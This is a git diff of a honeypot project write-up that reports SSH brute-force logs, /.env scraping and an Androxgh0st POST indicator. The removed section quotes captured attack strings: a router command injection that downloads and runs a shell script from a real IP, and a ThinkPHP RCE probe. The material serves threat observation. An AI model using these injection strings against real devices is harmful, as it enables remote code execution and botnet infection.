@@ -13,7 +13,7 @@ This project is what's known as a [honeypot]. Essentially, it is a fake server u
 
 Due to my intentions with the honeypot, I did not see the need to beef it up and make it look particularly enticing for an attacker to try to infiltrate and escalate privileges. Mine was to serve as more of a monitor of HTTP traffic to see what is simply floating around on the internet and where it comes from. 
 
-In essence, I hosted two virtual servers on the Google Cloud Platform. One for monitoring ingress traffic and another to serve as the honeypot itself. There were virtually no firewall rules on the honeypot, so most traffic would be free range. Both were simple ubuntu servers with MHN and Dionaea configured. When setup correctly, the MHN framework allows us to simply `http` into the admin server to view the user interface in which we can see some analytics about the incoming attacks.
+In essence, I hosted two virtual servers on the Google Cloud Platform. One for monitoring ingress traffic and another to serve as the honeypot itself. There were virtually no firewall rules on the honeypot, so most traffic would be free range. Both were simple ubuntu servers with MHN and Dionaea configured. When setup correctly, the MHN framework allows us to `http` into the admin server to view the user interface in which we can see some analytics about the incoming attacks.
 > There are even some neat features integrated such as HoneyMap, which maps out the incoming attacks in real time.
 
 ### Admin UI
@@ -55,21 +55,24 @@ Jan 26 13:55:12 honeypot-1 sshguard[788]: Blocking 120.224.50.233 for 840 secs (
 Jan 26 17:08:12 honeypot-1 sshguard[788]: Blocking 121.5.9.52 for 840 secs (4 attacks in 280 secs, after 1 abuses over 280 secs)
 ```
 
-These alerts are from the auth.log indicating attempts of ssh brute-forcing. After only three days of being up, my honeypot was already getting tested by loud tactics. By what sshguard could catch, there were 12 definite attempts; however, looking at the full log, there are actually a handful of persistent ip's that test periodically. 
+These alerts are from the auth.log indicating attempts of ssh brute-forcing. After only three days of being up, my honeypot was already getting tested by loud tactics. By what sshguard could catch, there were 12 definite attempts; however, looking at the full log, there are actually a handful of persistent ip's that test periodically to avoid getting blocked by sshguard. 
 
-### Injections
+### URL Manipulation
+![image](https://user-images.githubusercontent.com/66766340/151514217-6aa829d3-796a-4493-80bf-76924a48fb81.png)
+
+It seems the attackers that send these GET requests for the /.env file are looking to scrape data from that config file in order to run a [successful SMTP attack] on web apps that have debug mode enabled.
+
+A useful indication of compromise is if they also try to POST with these [bytes]:
 ```
-SOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings/`cd && cd tmp && export PATH=$PATH:. && cd /tmp;wget http://107.189.12.195/wget.sh;chmod 777 wget.sh;sh wget.sh selfrep.dlink;rm -rf wget.sh`"
-
-/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21
+0000   42 01 0a 8a 00 03 42 01 0a 8a 00 01 08 00 45 00   B.....B.......E.
+0010   00 3c 4f f4 40 00 76 06 20 38 9f f2 ea 10 0a 8a   .<O.@.v. 8......
+0020   00 03 24 e0 00 50 64 94 42 c1 00 82 6d f0 50 18   ..$..Pd.B...m.P.
+0030   02 03 9e d5 00 00 30 78 25 35 42 25 35 44 3d 61   ......0x%5B%5D=a
+0040   6e 64 72 6f 78 67 68 30 73 74                     ndroxgh0st
 ```
+Which are also pulled directly from my pcap.
 
-Above are a couple of injection attempts. Both caused my honeypot to issue error 400's, but these seem done manually. The first one attempts to download some script, run it, and delete itself afterwards. The second tries to get a php backend to return some information, maybe.
-
-The first one exposes a potential malware url. I tried checking it out; however, it seemed to be down by the time I got to it. That would've been a good opportunity to try to pull the script that it would've tried to run on my honeypot.
-
-### Malware Network Indication
-
+There are also a handful of POST requests that try to upload scripts to directories within the honeypot; however, since they don't exist the requests failed. Other than the GET /.env requests, there is similar traffic also looking for config files in order to gain some good footholds on actual websites which may be compromised in that manner.
 
 [honeypot]: https://blog.malwarebytes.com/101/2021/05/what-is-a-honeypot-how-they-are-used-in-cybersecurity/
 [Modern Honey Network]: https://github.com/pwnlandia/mhn
@@ -78,3 +81,6 @@ The first one exposes a potential malware url. I tried checking it out; however,
 [FLAREVM]: https://github.com/mandiant/flare-vm
 [VirusTotal]: https://www.virustotal.com/gui/home/url
 [many examples]: https://github.com/colton-gabertan/xcjg-honeypot/blob/Index/honeypotFindings/ftp.pcap
+[successful SMTP attack]: https://thedfirreport.com/2021/02/28/laravel-debug-leaking-secrets/
+[bytes]: https://security.stackexchange.com/questions/255881/what-does-a-post-like-0x5b5d-somename-try-to-achieve
+[my pcap]: https://github.com/colton-gabertan/xcjg-honeypot/blob/Index/honeypotFindings/http.pcap
